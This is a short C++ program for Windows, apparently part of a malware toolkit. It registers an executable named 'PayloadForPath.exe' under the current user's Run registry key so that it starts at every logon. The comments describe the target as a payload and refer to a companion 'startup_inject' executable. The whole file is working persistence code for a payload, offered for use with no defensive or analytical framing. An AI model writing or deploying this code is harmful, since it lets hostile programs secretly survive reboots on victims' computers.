#include <Windows.h>
#include <iostream>

int main(void)
{
	HKEY hkey = NULL;
	// replace with the name of the generated executable
	// payload and startup_inject EXEs need to be in the same directory
	LPCWSTR path = L"PayloadForPath.exe";
	RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	RegSetValueEx(hkey, L"myapp", 0, REG_SZ, (BYTE*)path, (wcslen(path) + 1) * 2);
	return 0;
}